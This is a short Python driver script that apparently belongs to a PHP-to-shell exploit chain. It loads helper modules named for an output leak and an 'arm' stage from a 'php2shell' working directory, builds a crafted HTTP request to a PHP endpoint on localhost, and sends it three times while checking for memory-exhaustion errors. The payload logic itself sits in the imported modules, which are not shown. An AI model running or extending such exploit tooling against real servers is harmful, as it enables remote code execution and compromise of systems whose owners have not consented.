#!/usr/bin/env python3
import importlib.util, socket, time
from pathlib import Path

def load(n, p):
    s = importlib.util.spec_from_file_location(n, p)
    m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m

H = Path("/tmp/opencode/realapps/side/php2shell")
L = load("l", H / "native-output-leak.py")
S = load("s", H / "native-output-leak-stock-arm.py")
C = load("c", H / "compact-stock-tail.py")

def rawRead(sock, deadline=60.0):
    sock.settimeout(5.0)
    buf = b""; t0 = time.time()
    while time.time() - t0 < deadline:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf

host, port, path = "127.0.0.1", 28842, "/index.php"
hdr = f"{host}:{port}"
body = S.arm_body(b"abcdefgh", C.ARM_FILENAME_LENGTH)
req = L.request_bytes(hdr, path, body, None, 23, True)  # close=True
for i in (1, 2, 3):
    try:
        c = socket.create_connection((host, port), timeout=65.0); c.settimeout(65.0)
        c.sendall(req)
        raw = rawRead(c)
        c.close()
        status = raw.split(b"\r\n", 1)[0].decode(errors="replace")
        head, _, body_txt = raw.partition(b"\r\n\r\n")
        oom = b"Allowed memory" in raw
        print(f"R{i}:", status, "len=", len(raw), "oom=", oom, body_txt[:80])
    except Exception as e:
        print(f"R{i}: ERR", str(e)[:120])
